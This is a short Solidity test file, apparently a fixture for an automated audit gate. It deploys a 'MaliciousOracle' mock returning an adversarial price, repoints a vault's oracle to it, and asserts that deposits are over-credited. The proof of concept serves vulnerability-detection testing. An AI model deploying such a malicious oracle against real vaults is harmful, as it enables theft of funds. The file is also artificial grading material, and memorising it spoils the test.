// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.20;

import {ScopedVault} from "../src/ScopedVault.sol";

// #2171 pass-after: the Royco MaliciousOracle idiom. An attacker-DEPLOYED mock implementing the OUT-OF-SCOPE
// settable IOracle callee returns an ADVERSARIAL price. PRECONDITION: the controlling role (the vault owner /
// config role that can repoint `oracle`) is modelled by the test acting as owner and calling setOracle. Injected
// via the discovered setter BEFORE the attack -> the over-credit reproduces -> the exploit assertion PASSES ->
// the gate scores FINDING. The stub name is DISTINCT from the in-scope target (never a `contract ScopedVault`
// shadow), so the #1471 linkage gate does not read it as a target substitution.
contract MaliciousOracle {
    function price() external pure returns (uint256) {
        return 1000000000000000000000000000000;
    }
}

contract HonestBaseline {
    function price() external pure returns (uint256) {
        return 1;
    }
}

contract PocScopedVaultStub {
    function test_stub() external {
        HonestBaseline baseline = new HonestBaseline();
        ScopedVault vault = new ScopedVault(address(baseline));
        MaliciousOracle evil = new MaliciousOracle();
        // PRECONDITION: the owner/config role repoints the settable callee at the attacker-deployed stub.
        vault.setOracle(address(evil));
        uint256 amount = 1000;
        uint256 minted = vault.deposit(amount);
        // A hostile return value over-credits shares far beyond the honest 1:1 baseline.
        require(minted > amount * 1000000, "over-credit exploit reproduced");
    }
}
